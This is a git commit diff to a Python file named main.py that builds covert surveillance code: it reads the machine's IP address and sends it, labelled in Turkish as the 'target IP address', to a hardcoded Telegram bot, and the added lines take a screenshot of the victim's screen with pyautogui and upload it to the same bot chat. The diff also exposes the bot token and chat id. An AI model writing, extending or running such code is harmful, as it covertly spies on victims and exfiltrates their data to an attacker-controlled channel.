edca106260668841664477a9cbda8020105af160
Grasiand <87449297+grasiand@users.noreply.github.com>
2023-07-15 21:33:06 +0300

    Update main.py

--- main.py
+++ main.py
@@ -12,4 +12,12 @@ import requests
 hostname = socket.gethostname()
 ip_address = socket.gethostbyname(hostname)
 
-requests.get("https://api.telegram.org/bot5901651008:AAE1CX1hIQEVwWUA38s9CyexI_lHk1suE70/sendmessage?chat_id=1887858124&text="+ip_address)
+requests.get(f"https://api.telegram.org/bot5901651008:AAE1CX1hIQEVwWUA38s9CyexI_lHk1suE70/sendmessage?chat_id=1887858124&text=Hedef İp Adresi : {ip_address}\n")
+url = f"https://api.telegram.org/bot5901651008:AAE1CX1hIQEVwWUA38s9CyexI_lHk1suE70/sendPhoto"
+screenshot = pyautogui.screenshot()
+image_bytes = io.BytesIO()
+screenshot.save(image_bytes, format='PNG')
+image_bytes.seek(0)
+files = {'photo': image_bytes}
+data = {'chat_id': "1887858124"}
+response = requests.post(url, files=files, data=data)
